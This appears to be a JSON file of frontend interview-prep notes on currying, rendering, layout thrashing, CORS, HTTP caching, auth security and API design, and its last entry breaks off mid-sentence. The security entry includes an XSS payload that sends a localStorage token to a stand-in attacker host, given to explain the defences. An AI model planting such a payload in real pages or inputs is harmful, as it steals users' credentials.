{
  "source": "user request: 1-day interview prep - browser & architecture",
  "learnings": [
    {
      "id": 153,
      "title": "Currying & Partial Application",
      "tags": [
        "currying",
        "closures",
        "functions"
      ],
      "source": "user request: 1-day interview prep - browser & architecture",
      "answer": "**Currying** transforms a function that takes many arguments into a chain of functions that each take one.\n\nTo put it simply: instead of `add(1, 2, 3)`, you get `add(1)(2)(3)` — and every step along the way is a usable function in its own right.\n\n## The Problem\n\nYou have a general-purpose function and you keep calling it with the same first argument:\n\n```javascript\nmultiply(2, 5);\nmultiply(2, 10);\nmultiply(2, 17);\n```\n\nThat repeated `2` is noise. What you actually want is a `double` function. Writing one by hand for every such case means a pile of near-identical wrappers.\n\n## The Solution\n\nCurrying lets you supply arguments *over time*. Each call that doesn't yet have enough arguments returns a new function that remembers what it's been given so far:\n\n```javascript\nconst double = curry(multiply)(2);\ndouble(5);   // 10\ndouble(10);  // 20\n```\n\nYou've **specialized** a general function without writing a wrapper.\n\n## What actually is a curried function?\n\n**It's a closure holding an array of arguments.** Nothing more.\n\nEach partial call returns a new function that has captured the arguments collected so far in its scope. When a call finally brings the total up to what the original function needs, it fires. The \"magic\" is just an array that grows across closures.\n\n```javascript\nfunction curry(fn) {\n  return function curried(...args) {\n    // Enough arguments? Run for real.\n    if (args.length >= fn.length) {\n      return fn.apply(this, args);\n    }\n\n    // Not yet — hand back a collector that remembers what we have.\n    return function (...rest) {\n      return curried.apply(this, [...args, ...rest]);\n    };\n  };\n}\n```\n\nThe mechanism that decides \"enough\" is **`fn.length`** — the number of declared parameters. And that has a gotcha worth knowing cold:\n\n```javascript\n((a, b) => 0).length;      // 2\n((a, b = 1) => 0).length;  // 1 — default parameters are not counted\n((...args) => 0).length;   // 0 — rest is not counted\n```\n\nSo variadic functions can't be curried this way; they fire immediately. Mention this and you're ahead of most candidates.\n\n## Currying vs partial application\n\nThey get conflated constantly, and knowing the difference is a cheap win:\n\n- **Currying** — strictly one argument at a time: `f(a)(b)(c)`.\n- **Partial application** — fix *some* arguments now, the rest later, in one step: `f.bind(null, a)` gives you something you call as `g(b, c)`.\n\nMost real-world \"curry\" implementations (including the one above, and lodash's) are actually **hybrid** — they accept either. That flexibility is why `curried(1, 2)(3)` and `curried(1)(2)(3)` both work.\n\n`Function.prototype.bind` is partial application built into the language.\n\n## Where you'd actually use it\n\n- **Specialized handlers** — `const onFieldChange = curry(handleChange)(fieldName)`\n- **Functional pipelines** — `pipe(map(double), filter(isEven))`, where each stage needs its config before it ever sees data\n- **Reusable configuration** — a `fetchWithConfig(baseUrl)(endpoint)` pattern\n\n## Trade-offs\n\n**Readability.** `f(a)(b)(c)` is harder to scan than `f(a, b, c)` for anyone unfamiliar with it. On a mixed team this is a real cost.\n\n**Debugging.** Stack traces fill up with anonymous intermediate functions.\n\n**Performance.** Every partial call allocates a closure. Irrelevant at normal scale; measurable in a hot loop.\n\n**Arity fragility.** Because it depends on `fn.length`, adding a default parameter to the underlying function silently changes when the curried version fires. That's a genuinely nasty bug class.\n\nIn practice, most React codebases use it rarely and reach for an inline arrow instead. Being able to say *that* — \"I know it, here's when it's worth it, and it usually isn't\" — is a better answer than enthusiasm.\n\nImplement it at [/coding/39](/coding/39)."
    },
    {
      "id": 154,
      "title": "Critical Rendering Path & SPA Bootstrapping",
      "tags": [
        "browser",
        "performance",
        "rendering"
      ],
      "source": "user request: 1-day interview prep - browser & architecture",
      "answer": "**The critical rendering path** is everything the browser does between receiving HTML bytes and painting the first pixel. Knowing it is what lets you answer *\"what happens when you type a URL and press enter?\"* — the most-asked browser question at this level.\n\nTo put it simply: the browser has to build two trees, combine them into a third, work out where everything goes, and only then can it paint.\n\n## The full journey\n\n**1. URL → IP.** DNS lookup, checked against the browser cache, OS cache, then a resolver.\n\n**2. Connection.** TCP handshake, then a TLS handshake for HTTPS. Both cost round trips — which is why connection reuse and HTTP/2 matter.\n\n**3. The HTML arrives** and the browser starts parsing *immediately*, as bytes stream in. It doesn't wait for the whole document.\n\n**4. Two trees get built:**\n\n- **DOM** — from the HTML\n- **CSSOM** — from the CSS\n\n**5. Render tree** — DOM and CSSOM combined, containing only what's actually visible. `display: none` nodes are excluded entirely. (`visibility: hidden` nodes *are* included — they occupy space.)\n\n**6. Layout (reflow)** — compute the geometry of every box.\n\n**7. Paint** — fill in pixels.\n\n**8. Composite** — combine layers, potentially on the GPU.\n\nSteps 6–8 are covered in more depth in [/learnings/27](/learnings/27).\n\n## What actually blocks the render?\n\nThis is the part interviews probe, because it's where the practical decisions live.\n\n**CSS is render-blocking.** The browser will not paint until the CSSOM is complete. It can't — it would risk showing unstyled content and then repainting everything. This is why `<link rel=\"stylesheet\">` belongs in the `<head>` and why inlining critical CSS speeds up first paint.\n\n**Synchronous JavaScript is parser-blocking.** When the parser hits `<script src>`, it stops building the DOM, fetches, executes, and only then resumes. Because a script might call `document.write`, the browser has no choice.\n\nWorse: **a script also waits on any CSS above it**, because the script might read computed styles. So one stylesheet can delay a script which delays the DOM.\n\nThe two fixes:\n\n```html\n<script src=\"app.js\" defer></script>  <!-- download in parallel, run after DOM is parsed, in order -->\n<script src=\"a.js\" async></script>    <!-- download in parallel, run the moment it lands, any order -->\n```\n\n**`defer` for application code** — order is preserved and the DOM exists when it runs. **`async` for independent third-party scripts** like analytics, where order doesn't matter.\n\n## SPA bootstrapping — the part that's specific to your work\n\nFor a client-rendered React app, the sequence after the HTML arrives is:\n\n1. HTML arrives — **essentially an empty `<div id=\"root\">`**\n2. The JS bundle downloads (often the biggest single cost)\n3. The bundle parses and executes — *this is not free*; parsing a megabyte of JS is real CPU time, especially on a mid-range phone\n4. React mounts and renders the initial tree\n5. `useEffect` fires and the first data fetch **starts** — which means the user is now waiting on a *second* round trip that couldn't even begin until now\n6. Data arrives, re-render, content appears\n\n**That step-5 problem is the core weakness of client-side rendering**, and it's what SSR and server components address: with SSR the HTML already contains content, so the user sees something at step 1 instead of step 6.\n\nWith SSR you then have **hydration** — React walks the server-rendered HTML and attaches event listeners. Until hydration completes, the page *looks* ready but doesn't respond to clicks. That gap is a real UX problem and the reason streaming and selective hydration exist.\n\n## The metrics they may name\n\n| Metric | Means | Good |\n| --- | --- | --- |\n| **TTFB** | Time to first byte — server + network | < 800ms |\n| **FCP** | First Contentful Paint — first content visible | < 1.8s |\n| **LCP** | Largest Contentful Paint — main content visible | < 2.5s |\n| **TTI** | Time to Interactive — actually responds to input | < 3.8s |\n| **CLS** | Cumulative Layout Shift — visual stability | < 0.1 |\n| **INP** | Interaction to Next Paint — replaced FID in 2024 | < 200ms |\n\n**CLS** is the one with the most actionable fix: reserve space for images (`width`/`height` attributes or `aspect-ratio`) and for anything that loads late, so content doesn't jump.\n\n## How to answer it out loud\n\n> \"DNS, TCP, TLS, then the HTML streams in and the parser starts building the DOM. CSS blocks rendering because you can't paint without the CSSOM, and synchronous scripts block the parser — so stylesheets go in the head and scripts get `defer`. DOM plus CSSOM gives the render tree, then layout, paint, composite.\n>\n> For an SPA there's an extra phase: the HTML is basically empty, so nothing shows until the bundle downloads, parses, and executes — and the first data fetch can't even start until React has mounted and effects run. That serial chain is why SSR helps, and why bundle size matters more than people expect on mobile.\"\n\n## Trade-offs\n\n- **Inlining critical CSS** speeds first paint but bloats the HTML and can't be cached separately.\n- **Code splitting** reduces initial bundle size but adds round trips later — over-splitting produces a request waterfall ([/advanced-react/14](/advanced-react/14)).\n- **SSR** improves perceived load but costs server compute and adds hydration complexity.\n- **Preload/prefetch** (`<link rel=\"preload\">`) can pull a critical resource forward, but over-preloading competes for bandwidth with the things that actually matter."
    },
    {
      "id": 155,
      "title": "Layout Thrashing & Forced Synchronous Layout",
      "tags": [
        "browser",
        "performance",
        "DOM"
      ],
      "source": "user request: 1-day interview prep - browser & architecture",
      "answer": "**Layout thrashing** is when you force the browser to recalculate layout many times in a single frame, by interleaving DOM reads and writes. It turns an O(n) loop into O(n) *layouts*, and it is the most common cause of jank that a profiler will actually let you fix.\n\nTo put it simply: the browser wants to batch your layout work, and reading a geometry property at the wrong moment forces it to stop and do the work immediately instead.\n\n## The Problem\n\nThe browser is already smart about this. When you write to the DOM, it doesn't recalculate layout right away — it marks the document dirty and queues the work to be flushed once, before the next paint. Batching is the default and it's efficient.\n\nBut some properties can only be answered with **current, accurate** geometry. If you ask for one while there are pending writes, the browser has no choice: it must flush the layout *right now*, synchronously, before it can return a number.\n\nThat's a **forced synchronous layout**. One is fine. In a loop, it's a disaster:\n\n```javascript\n// Every iteration: write (dirty) → read (forced layout). N layouts.\nfor (const box of boxes) {\n  box.style.width = box.offsetWidth + 10 + 'px';\n}\n```\n\nWith 100 elements that's 100 full layout passes in one frame. At 60fps you have 16.7ms per frame total, and you have just spent all of it.\n\n## The Solution\n\n**Batch all reads, then all writes.**\n\n```javascript\n// Read phase — one layout flush for the whole loop\nconst widths = boxes.map((box) => box.offsetWidth);\n\n// Write phase — nothing forces a flush, so it happens once at the end\nboxes.forEach((box, i) => {\n  box.style.width = widths[i] + 10 + 'px';\n});\n```\n\nSame work, same result. **One layout instead of one hundred.**\n\nThis read-then-write discipline has a name — the **read/write batching** or \"FastDOM\" pattern — and stating it by name is a good signal.\n\n## What actually triggers a forced layout?\n\nAnything that needs up-to-date geometry. The list worth remembering:\n\n| Category | Properties |\n| --- | --- |\n| **Element geometry** | `offsetWidth/Height/Top/Left`, `clientWidth/Height`, `scrollWidth/Height`, `scrollTop/Left` |\n| **Methods** | `getBoundingClientRect()`, `getClientRects()`, `scrollIntoView()`, `focus()` |\n| **Computed style** | `getComputedStyle(el)` — for any property that depends on layout |\n| **Window** | `window.innerWidth/Height`, `scrollX/Y` |\n\nReading these is *not* inherently bad. Reading them **after a write, inside a loop** is.\n\n## In React specifically\n\nReact batches its own state updates, so this rarely bites you through normal rendering. It bites you in **refs and effects**:\n\n```javascript\n// Runs before paint — a read here is a forced synchronous layout,\n// but it's the correct place if you need to measure and adjust\nuseLayoutEffect(() => {\n  const height = ref.current.getBoundingClientRect().height;\n  setTooltipPosition(height);   // adjust before the user sees anything\n}, []);\n```\n\n`useLayoutEffect` runs **synchronously after DOM mutation but before paint** — which is exactly why it's the right tool for measure-then-adjust, and exactly why overusing it blocks painting. `useEffect` runs *after* paint, so measuring there causes a visible flicker as the element jumps to its corrected position ([/react-guide/8](/react-guide/8)).\n\nThe other React-flavored version is a scroll or resize handler that reads geometry on every event. Those fire far more often than once per frame — so throttle them, or better, use `requestAnimationFrame` so they run at most once per frame:\n\n```javascript\nlet scheduled = false;\n\nwindow.addEventListener('scroll', () => {\n  if (scheduled) return;\n  scheduled = true;\n\n  requestAnimationFrame(() => {\n    const y = window.scrollY;   // read once per frame, not per event\n    update(y);\n    scheduled = false;\n  });\n});\n```\n\nBetter still for visibility checks: **`IntersectionObserver`**, which reports element visibility without you reading geometry at all. If you're asked how to implement infinite scroll or lazy loading, that's the answer that shows current knowledge.\n\n## How to spot it\n\nChrome DevTools → Performance → record. Look for:\n\n- Long purple **Layout** blocks\n- The warning **\"Forced reflow is a likely performance bottleneck\"**\n- A sawtooth pattern of many small layout bars inside one frame\n\nThat warning names the offending line. It's one of the most directly actionable things the profiler tells you.\n\n## Trade-offs and follow-ups\n\n**\"Isn't this premature optimization?\"** — For ten elements, yes. It matters when you're touching many elements per frame, or in a scroll handler. The honest answer is: write it naturally, profile, and fix it when the profiler points there.\n\n**\"What about `will-change`?\"** — It promotes an element to its own compositor layer so transforms skip layout and paint entirely. But each layer costs GPU memory, so applying it broadly makes things *worse*. Add it just before an animation and remove it after.\n\n**\"How do you animate without touching layout at all?\"** — Animate only `transform` and `opacity`. Those run on the compositor thread and skip layout and paint completely ([/learnings/27](/learnings/27)). Animating `left` or `width` triggers layout on every single frame."
    },
    {
      "id": 156,
      "title": "CORS",
      "tags": [
        "browser",
        "security",
        "HTTP"
      ],
      "source": "user request: 1-day interview prep - browser & architecture",
      "answer": "**CORS** — Cross-Origin Resource Sharing — is the mechanism by which a server tells the browser *\"it's fine for this other origin to read my response.\"*\n\nTo put it simply: CORS is not a wall that stops your request. It's a permission slip the server hands back, and the **browser** is the one enforcing it.\n\n## The Problem it solves\n\nWithout restrictions, any page you visit could fire a `fetch` at `your-bank.com`, ride along on your logged-in cookies, and read your balance. The **same-origin policy** exists to prevent that: by default, JavaScript on one origin cannot *read* responses from another.\n\nAn **origin** is the triple `scheme + host + port`. All of these are cross-origin relative to `https://app.example.com`:\n\n| URL | Why |\n| --- | --- |\n| `http://app.example.com` | different scheme |\n| `https://api.example.com` | different host (a subdomain is a different host) |\n| `https://app.example.com:8080` | different port |\n\nBut total lockdown is too strict — real apps legitimately call their own API on another domain. CORS is the controlled exception.\n\n## What actually happens\n\nHere's the part that clears up most confusion: **the request usually goes through and the server usually processes it.** The browser then refuses to hand you the response because the right header wasn't on it.\n\nSo a CORS error does not mean \"blocked before sending.\" For a simple request, your backend already ran the code. This is why *a CORS failure can still have created a record in the database* — a genuinely surprising fact and a great thing to know.\n\nThe browser sends an `Origin` header. The server must reply with:\n\n```\nAccess-Control-Allow-Origin: https://app.example.com\n```\n\nIf that header is absent or doesn't match, the browser discards the response and throws. Your `fetch` rejects; you cannot inspect the status or the body.\n\n## Preflight — the `OPTIONS` request\n\nSome requests are considered **\"simple\"** and go straight out. A request is simple only if:\n\n- Method is `GET`, `HEAD`, or `POST`, **and**\n- The only headers set are a safe-listed few, **and**\n- `Content-Type` is one of `text/plain`, `multipart/form-data`, or `application/x-www-form-urlencoded`\n\nAnything else — `PUT`, `DELETE`, a custom `Authorization` header, or (very commonly) **`Content-Type: application/json`** — triggers a **preflight**: the browser first sends an `OPTIONS` request asking permission.\n\n```\nOPTIONS /api/users\nOrigin: https://app.example.com\nAccess-Control-Request-Method: PUT\nAccess-Control-Request-Headers: content-type, authorization\n```\n\nThe server must answer:\n\n```\nAccess-Control-Allow-Origin: https://app.example.com\nAccess-Control-Allow-Methods: GET, POST, PUT, DELETE\nAccess-Control-Allow-Headers: Content-Type, Authorization\nAccess-Control-Max-Age: 86400\n```\n\nOnly then does the real request go. **`Access-Control-Max-Age` caches that permission** so you're not paying an extra round trip on every call — a genuine performance detail worth raising.\n\nNote the asymmetry: a preflighted request that fails **never reaches your handler**. A simple request that fails **does**.\n\n## Credentials — the trap everyone hits\n\nTo send cookies cross-origin you need both sides to opt in:\n\n```javascript\nfetch(url, { credentials: 'include' });\n```\n\nAnd the server must send:\n\n```\nAccess-Control-Allow-Origin: https://app.example.com   ← exact origin, NOT *\nAccess-Control-Allow-Credentials: true\n```\n\n**`Access-Control-Allow-Origin: *` is rejected when credentials are involved.** The wildcard works fine until someone adds cookies, and then it breaks with an error message that doesn't obviously point at the wildcard. This is the single most common real-world CORS bug — knowing it in advance is worth a lot.\n\n## The four failures you'll actually see\n\n1. **\"No `Access-Control-Allow-Origin` header is present\"** — the server isn't configured for CORS at all, or not for your origin.\n2. **\"The value of `Access-Control-Allow-Origin` must not be the wildcard when credentials mode is `include`\"** — the wildcard-plus-cookies trap above.\n3. **\"Method PUT is not allowed by `Access-Control-Allow-Methods`\"** — preflight rejected; the server didn't list your method.\n4. **\"Request header field `authorization` is not allowed\"** — the server didn't list your custom header in `Access-Control-Allow-Headers`.\n\n## How you fix it — in priority order\n\n**Configure the server.** This is the real fix. CORS is a *server* setting; there is no correct client-side workaround.\n\n**Use a dev proxy.** In Vite, `server.proxy` makes the request same-origin from the browser's point of view, so CORS never applies. Development only.\n\n**Same-origin in production via a reverse proxy or BFF** — serve the API under `/api` on the same origin. Then CORS is irrelevant *and* you can use `httpOnly` cookies without cross-site complications.\n\n**What is never the fix:** a browser extension that disables CORS, or `mode: 'no-cors'`. `no-cors` returns an **opaque** response — status 0, no readable body. It silences the error by making the response useless. Saying this explicitly is a good signal; a lot of people think `no-cors` is a solution.\n\n## Follow-ups\n\n**\"Why doesn't Postman get CORS errors?\"** — Because CORS is enforced by *browsers*, not servers. Postman isn't a browser and has no origin to protect. This question is a direct test of whether you understand where enforcement lives.\n\n**\"Why do `<img>` and `<script>` tags work cross-origin?\"** — Because the same-origin policy restricts *reading*, not *loading*. You can display a cross-origin image, but you can't read its pixels out of a canvas without CORS — doing so \"taints\" the canvas.\n\n**\"Is CORS a security feature?\"** — It's a *relaxation* of one. The same-origin policy is the security feature; CORS is the controlled way to poke holes in it. It protects users from malicious sites, not servers from malicious clients — anyone can still call your API directly with curl. Server-side authorization is what protects the API."
    },
    {
      "id": 157,
      "title": "HTTP Caching",
      "tags": [
        "browser",
        "performance",
        "HTTP",
        "caching"
      ],
      "source": "user request: 1-day interview prep - browser & architecture",
      "answer": "**HTTP caching** is how the browser avoids re-downloading things it already has. It's the cheapest performance win available, and the most common source of \"why is the user still seeing the old version?\"\n\nTo put it simply: the server attaches instructions to each response saying how long the browser may reuse it, and how to check cheaply whether it's still good.\n\n## The Problem\n\nEvery asset re-downloaded is bandwidth, latency, and battery you didn't need to spend. But cache too aggressively and you ship a bug fix that nobody receives for a week. The whole subject is managing that tension.\n\n## Two questions, two mechanisms\n\nCaching answers two separate questions, and confusing them is where most bugs come from:\n\n**1. \"Can I skip the request entirely?\"** → **freshness**, via `Cache-Control`.\n**2. \"It might be stale — has it actually changed?\"** → **validation**, via `ETag` / `Last-Modified`.\n\nThe first avoids the network completely. The second still costs a round trip, but avoids re-downloading the body.\n\n## `Cache-Control` — the directives that matter\n\n```\nCache-Control: max-age=31536000, immutable\n```\n\n| Directive | Means |\n| --- | --- |\n| `max-age=N` | Fresh for N seconds. **Don't even ask.** |\n| `no-cache` | Cache it, but **revalidate every time** before use. Misleadingly named. |\n| `no-store` | Never write it down at all. For sensitive data. |\n| `private` | Browser may cache; shared caches and CDNs may not. |\n| `public` | Any cache may store it, even with an `Authorization` header. |\n| `immutable` | It will never change — skip revalidation even on reload. |\n| `stale-while-revalidate=N` | Serve the stale copy instantly, refresh in the background. |\n\n**`no-cache` does not mean \"don't cache.\"** It means \"cache, but always check first.\" `no-store` is the one that means don't cache. This distinction is a very common interview question precisely because the naming is bad.\n\n## Validation — `ETag` and `304`\n\nWhen something is stale but probably unchanged, the browser asks cheaply:\n\n```\nResponse:  ETag: \"abc123\"\nLater →    If-None-Match: \"abc123\"\nServer  →  304 Not Modified          ← no body, just headers\n```\n\nA `304` is a few hundred bytes instead of a few hundred kilobytes. `Last-Modified` / `If-Modified-Since` works the same way with a timestamp, but it's only second-granular and breaks when a rebuild changes mtimes without changing content. **`ETag` is the better mechanism.**\n\n## The strategy that solves the tension\n\nThis is the answer to *\"how do you cache aggressively without shipping stale code?\"* — and it's what every modern bundler does:\n\n**Content-hash your assets and cache them forever.**\n\n```\n/assets/app.a3f9c2.js     Cache-Control: max-age=31536000, immutable\n/assets/main.7b21e4.css   Cache-Control: max-age=31536000, immutable\n```\n\n**Never cache the HTML.**\n\n```\n/index.html               Cache-Control: no-cache\n```\n\nThe logic is elegant: the filename contains a hash of the contents, so **a changed file is a different URL**. There's no such thing as a stale `app.a3f9c2.js` — if the code changed, the name changed. Meanwhile `index.html` is revalidated on every visit, and it's the file that points at the new hashed names. One small conditional request unlocks the entire new build.\n\nThat's why Vite and webpack put hashes in output filenames by default. Being able to explain *why* is a strong answer.\n\n## `stale-while-revalidate`\n\n```\nCache-Control: max-age=60, stale-while-revalidate=3600\n```\n\nFresh for 60 seconds. For the next hour, serve the **stale copy immediately** while fetching a fresh one in the background. The user never waits; the next visit gets the update.\n\nThe same idea drives React Query and SWR (the library is literally named after this header) at the application layer: show cached data instantly, refetch quietly, update when it lands.\n\n## The layers of cache\n\nA request can be answered at any of these, nearest first:\n\n1. **Memory cache** — this tab, this session. Instant.\n2. **Disk cache** — the browser's persistent HTTP cache.\n3. **Service worker** — programmable; you control it in JS. Enables offline.\n4. **CDN / edge** — shared across all users, near them geographically.\n5. **Origin server** — and possibly its own Redis or application cache.\n\nUse `private` to keep per-user responses out of layers 4 and 5. Getting that wrong means one user's data served to another — the worst caching bug there is, and worth naming as a risk.\n\n## In application code\n\nBeyond HTTP, the caching you actually write:\n\n- **React Query / SWR** — the server-state cache: `staleTime`, `cacheTime`, background refetch, dedup of identical in-flight requests\n- **`useMemo`** — caching a computed value across renders ([/react-guide/9](/react-guide/9))\n- **Memoized functions** — caching by argument ([/coding/27](/coding/27))\n- **`localStorage`** — persisting across sessions, but synchronous and easy to let go stale\n\n## Trade-offs and follow-ups\n\n**\"How do you invalidate?\"** — The honest answer is that you mostly don't. You make invalidation unnecessary by changing the URL (content hashing). Where you genuinely must invalidate, CDNs offer purge APIs, and cache tags let you purge a group.\n\n**\"What's the risk of caching too aggressively?\"** — Users stuck on a broken build with no way to recover except a hard refresh. This is precisely why `index.html` is `no-cache` — it's the escape hatch that lets every other file be cached forever.\n\n**\"Should API responses be cached?\"** — Depends on volatility and whether they're per-user. A public product list, absolutely — `max-age` plus `stale-while-revalidate`. A user's account page, `private, no-cache` at most. Anything with tokens or PII, `no-store`.\n\n**\"Service worker or HTTP cache?\"** — HTTP caching first; it's declarative and hard to get catastrophically wrong. Service workers give you offline support and fine-grained control, at the cost of a genuinely tricky update lifecycle — a bad service worker can pin users to an old build semi-permanently."
    },
    {
      "id": 158,
      "title": "Auth & Security: JWT, XSS, CSRF",
      "tags": [
        "security",
        "authentication",
        "browser"
      ],
      "source": "user request: 1-day interview prep - browser & architecture",
      "answer": "Authentication is **who you are**. Authorization is **what you're allowed to do**. Frontend interviews probe the first, and the storage decision that follows it.\n\nTo put it simply: the server hands you proof of identity, and every subsequent request has to carry that proof. Where you put it is the whole security conversation.\n\n## Two models\n\n**Session (stateful).** The server creates a session, stores it (in memory, Redis, a database), and sends you an opaque session ID in a cookie. Every request sends the cookie; the server looks it up.\n\n- Revoking is trivial — delete the session row and the user is out instantly\n- Requires server-side state, which needs sharing across instances\n\n**JWT (stateless).** The server signs a token containing claims (user id, roles, expiry). Nothing is stored server-side; the signature is what proves it wasn't tampered with.\n\n- Scales horizontally with no shared store — any instance can verify it\n- **Revoking is hard.** A valid token stays valid until it expires. If it's stolen, you cannot easily kill it\n\nA JWT is three base64 chunks: header, payload, signature. **The payload is signed, not encrypted** — anyone holding the token can decode and read it. Never put anything secret in a JWT. That's a favorite gotcha question.\n\nThe standard mitigation for the revocation problem: **short-lived access tokens** (5–15 minutes) plus a **long-lived refresh token** stored more securely. The blast radius of a stolen access token is then minutes, not days.\n\n## Where do you store the token?\n\nThis is *the* frontend question, and the answer is a trade-off, not a rule.\n\n| | `localStorage` | `httpOnly` cookie |\n| --- | --- | --- |\n| Readable by JS | **Yes** — any XSS steals it | **No** — invisible to JS |\n| Sent automatically | No — you attach it | Yes — on every matching request |\n| Vulnerable to XSS | **Yes** | Much less |\n| Vulnerable to CSRF | No | **Yes** — needs `SameSite`/tokens |\n| Cross-domain API | Easy | Needs CORS credentials setup |\n\n**The strongest general answer:**\n\n> \"I'd use an `httpOnly`, `Secure`, `SameSite=Lax` cookie for the refresh token, and keep the access token in memory only — a JS variable, not `localStorage`. Memory dies on refresh, so on load I silently exchange the refresh cookie for a fresh access token.\n>\n> That means an XSS can't read the refresh token at all, and the access token isn't sitting in persistent storage where a single injected script can scrape it. The cost is CSRF exposure on the refresh endpoint, which `SameSite` plus a CSRF token handles.\"\n\nThat answer demonstrates you understand there's no free option — you're choosing which attack to defend against and mitigating the other.\n\n**Why `localStorage` is genuinely risky:** it is readable by *any* JavaScript running on the page. That includes every npm dependency and every third-party script. One compromised package and every token is exfiltrated. `httpOnly` cookies survive that scenario because JS simply cannot see them.\n\n## XSS — Cross-Site Scripting\n\n**Attacker gets their JavaScript running on your page.** Then they have everything the user has.\n\n```javascript\n// Attacker submits this as their display name:\n<img src=x onerror=\"fetch('https://evil.com?t='+localStorage.token)\">\n```\n\n**React protects you by default** — it escapes all interpolated values, so `{userInput}` renders as text, never as markup. The ways you lose that protection:\n\n- **`dangerouslySetInnerHTML`** — the name is a deliberate warning. Sanitize with DOMPurify first.\n- **`href={userInput}`** — a `javascript:` URL executes on click. Validate the protocol.\n- **Rendering into the DOM manually** via a ref and `innerHTML`.\n- **`eval`** or `new Function` on anything user-derived.\n\nThe defense in depth is **Content Security Policy** — a header restricting which script sources may execute:\n\n```\nContent-Security-Policy: default-src 'self'; script-src 'self'\n```\n\nWith a strict CSP, even a successful injection often can't run, because inline scripts are blocked.\n\n## CSRF — Cross-Site Request Forgery\n\n**The attacker doesn't steal your cookie — they get the browser to send it.** A hidden form on `evil.com` POSTs to `yourbank.com/transfer`, and the browser helpfully attaches your cookies because that's what cookies do.\n\nNote this only works against *automatic* credentials. It's a cookie problem specifically — a token you attach manually in an `Authorization` header isn't sent by a forged cross-site request.\n\nDefenses:\n\n- **`SameSite=Lax`** (the modern browser default) — cookies aren't sent on cross-site POSTs. This alone kills most CSRF.\n- **`SameSite=Strict`** — not sent on any cross-site request, including following a link *into* your site. More secure, worse UX.\n- **CSRF tokens** — a per-session random value the server requires in the body or a header. `evil.com` can't read it (same-origin policy), so it can't forge a valid request.\n\n**The clean one-liner:** *XSS steals the credential; CSRF abuses it in place. `httpOnly` stops the theft, `SameSite` stops the abuse.*\n\n## The other things worth a sentence\n\n- **`Secure`** flag — cookie only over HTTPS.\n- **Clickjacking** — your site in an invisible iframe over a decoy. Fixed with `X-Frame-Options: DENY` or CSP `frame-ancestors`.\n- **Open redirect** — `?next=` pointing off-site. Validate redirect targets against an allowlist.\n- **Never trust the client.** Hiding an admin button is UX, not security. Every check must be re-done server-side. If they ask one authorization question, it's usually this.\n- **Secrets in the bundle** — anything in a frontend env var ships to the user. `VITE_`-prefixed variables are *public*. Only a backend may hold an API secret.\n\n## OAuth in one paragraph\n\nYou don't hand your password to a third party. You're redirected to the provider, you authorize, and they redirect back with a short-lived **code**, which your server exchanges for a token using its own secret. The code-plus-secret exchange is what stops an intercepted redirect from being useful. For public clients that can't hold a secret — SPAs and mobile apps — the modern requirement is **PKCE**, which substitutes a per-request generated verifier for the static secret. *OAuth is authorization; **OIDC** is the identity layer built on top that actually tells you who the user is.*\n\n## Follow-ups\n\n**\"How do you handle token expiry gracefully?\"** — An interceptor: on a `401`, pause the failing request, refresh the token once, retry. Queue any concurrent requests so a burst of 401s doesn't trigger five parallel refreshes — that's the detail that shows you've built it.\n\n**\"How do you log someone out everywhere?\"** — Easy with sessions. With JWTs you need a revocation list or short expiry plus refresh-token invalidation — which is exactly the trade-off you accepted by going stateless.\n\n**\"Is `localStorage` ever acceptable?\"** — For a low-stakes internal tool, honestly yes, and pretending otherwise is dogma. But say what you're accepting: any XSS is a full account compromise."
    },
    {
      "id": 159,
      "title": "Frontend API Architecture",
      "tags": [
        "architecture",
        "API",
        "async"
      ],
      "source": "user request: 1-day interview prep - browser & architecture",
      "answer": "**Frontend API architecture** is the set of decisions about how your UI talks to the server: what shape the calls take, who owns error handling and retries, and where the boundary between client and server actually sits.\n\nTo put it simply: the question isn't \"how do I call `fetch`\" — it's \"what layer owns the network, so that components don't have to.\"\n\n## The Problem\n\n`fetch` inside a component is fine exactly once. At scale it produces the same five problems in every codebase:\n\n- The base URL and auth header are copy-pasted everywhere\n- Error handling is inconsistent — some places catch, some don't\n- Two components mounting together fire the same request twice\n- Nothing is retried, or everything is retried including the things that shouldn't be\n- Every component reimplements loading and error state\n\nThe fix is a **layer**, not a library. Even a thin one.\n\n## The layers\n\n```\nComponent        →  renders; knows nothing about HTTP\n   ↓\nHook / query     →  caching, loading & error state, refetch\n   ↓\nAPI module       →  typed functions: getUsers(), createOrder()\n   ↓\nHTTP client      →  base URL, auth header, interceptors, retries\n   ↓\nServer / BFF\n```\n\nThe rule that makes this work: **a component should never know a URL exists.** It calls `useUsers()`. If the endpoint moves, one file changes.\n\n```javascript\n// http.js — one place for cross-cutting concerns\nasync function request(path, options = {}) {\n  const res = await fetch(`${BASE_URL}${path}`, {\n    ...options,\n    headers: { 'Content-Type': 'application/json', ...authHeader(), ...options.headers },\n  });\n\n  if (!res.ok) {\n    // Normalize failures into one error shape the whole app understands\n    throw new ApiError(res.status, await res.json().catch(() => null));\n  }\n\n  return res.status === 204 ? null : res.json();\n}\n\n// api/users.js — the vocabulary of your domain, not of HTTP\nexport const getUsers = (params) => request(`/users?${new URLSearchParams(params)}`);\nexport const createUser = (body) => request('/users', { method: 'POST', body: JSON.stringify(body) });\n```\n\n**The `!res.ok` check is the detail interviewers look for.** `fetch` only rejects on *network* failure — a `404` or `500` resolves normally with `ok: false`. Code that only uses `.catch()` silently treats server errors as success. That's a real bug that ships often.\n\n## REST vs GraphQL vs BFF\n\n**REST** — resources and verbs. Simple, cacheable by HTTP out of the box, universally understood. Its weakness is shape: you get **over-fetching** (the endpoint returns 40 fields, you render 3) and **under-fetching** (you need three round trips to build one screen — the classic waterfall).\n\n**GraphQL** — the client declares exactly what it needs, in one request. Solves both fetching problems and is excellent when many different clients need different shapes of the same data. Costs: HTTP caching no longer works out of the box (everything is a POST to one URL), you need query-complexity limits to prevent abuse, and the tooling is heavier. It also makes the N+1 problem the server's headache.\n\n**BFF (Backend For Frontend)** — a thin server layer you own, sitting between your UI and the real services, shaping responses for exactly this frontend. The pragmatic middle ground: it kills over-fetching without adopting GraphQL, lets you keep secrets server-side, and gives you a same-origin API so CORS and cookie handling get simpler ([/learnings/156](/learnings/156)).\n\n**How to answer \"which would you pick?\"** — Don't pick abstractly. *\"Depends on how many clients consume this and how variable the data needs are. One web client against a stable API: REST, with a BFF if I'm fighting over-fetching. Several clients each needing different slices: GraphQL earns its complexity.\"*\n\n## Errors, retries, and the details that matter\n\n**Retry only what's safe.** `GET` is idempotent — retrying is harmless. Blindly retrying a `POST` can create two orders. Retry `GET`s and explicitly idempotent mutations; for the rest, use an idempotency key.\n\n**Retry only what might succeed.** A 